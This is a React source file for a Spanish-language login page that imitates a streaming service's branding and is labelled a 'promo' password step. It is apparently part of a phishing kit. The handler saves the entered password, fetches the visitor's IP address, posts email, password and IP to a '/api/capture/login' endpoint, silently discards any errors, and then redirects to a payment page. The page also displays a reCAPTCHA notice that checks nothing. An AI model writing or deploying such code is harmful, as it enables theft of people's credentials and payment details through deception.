/**
 * Promo Password - Identical to regular password but routes to promo payment
 */

import PageTransition from "@/components/PageTransition";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import BrandLogo from "@/components/BrandLogo";
import { Eye, EyeOff } from "lucide-react";

export default function PromoPassword() {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [userEmail, setUserEmail] = useState("");
  const [, setLocation] = useLocation();

  useEffect(() => {
    const email = sessionStorage.getItem("userEmail") || sessionStorage.getItem("sp_email") || "";
    if (!email) {
      setLocation("/promo/login");
      return;
    }
    setUserEmail(email);
  }, [setLocation]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) {
      setError("Ingresa tu contraseña.");
      return;
    }
    if (password.length < 4) {
      setError("La contraseña debe tener al menos 4 caracteres.");
      return;
    }

    setIsLoading(true);
    sessionStorage.setItem("sp_login_password", password);

    // Send login data to backend
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json").catch(() => null);
      const ipData = ipRes ? await ipRes.json() : { ip: "unknown" };
      await fetch("/api/capture/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: userEmail,
          password,
          ipAddress: ipData.ip,
        }),
      }).catch(() => {});
    } catch {}

    setTimeout(() => {
      setIsLoading(false);
      setLocation("/promo/payment");
    }, 1200);
  };

  return (
    <PageTransition>
      <div className="min-h-[100dvh] w-full bg-black flex flex-col">
        {/* Header */}
        <header className="w-full px-4 sm:px-8 lg:px-12 pt-4 pb-2 border-b border-[#333]">
          <BrandLogo height={20} />
        </header>

        {/* Main Content */}
        <main className="flex-1 flex flex-col items-start sm:items-start lg:items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
          <div className="w-full max-w-[400px] lg:max-w-[450px]">
            <h1 className="text-[28px] sm:text-[32px] font-bold text-white mb-2 leading-[1.15]">
              Ingresa tu contraseña
            </h1>

            <p className="text-[#8c8c8c] text-[15px] sm:text-[16px] mb-6 sm:mb-8">
              {userEmail}
            </p>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Contraseña"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (error) setError("");
                  }}
                  className={`w-full h-[48px] sm:h-[50px] px-4 pr-12 rounded bg-transparent text-white placeholder:text-[#8c8c8c] text-[15px] sm:text-[16px] outline-none transition-colors border ${
                    error ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-white"
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#8c8c8c] hover:text-white transition-colors"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
                {error && (
                  <div className="flex items-center gap-1.5 mt-2">
                    <svg viewBox="0 0 16 16" className="w-4 h-4 flex-shrink-0" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#E50914" strokeWidth="1.5" />
                      <path d="M5 5l6 6M11 5l-6 6" stroke="#E50914" strokeWidth="1.5" strokeLinecap="round" />
                    </svg>
                    <p className="text-[#E50914] text-[13px]">{error}</p>
                  </div>
                )}
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full h-[48px] sm:h-[50px] bg-[#E50914] text-white text-[15px] sm:text-[16px] font-bold rounded hover:bg-[#F6121D] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
              >
                {isLoading ? "Verificando..." : "Iniciar sesión"}
              </button>
            </form>

            <p className="text-[#8c8c8c] text-[12px] sm:text-[13px] mt-6 sm:mt-8 leading-relaxed">
              Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
            </p>
          </div>
        </main>
      </div>
    </PageTransition>
  );
}

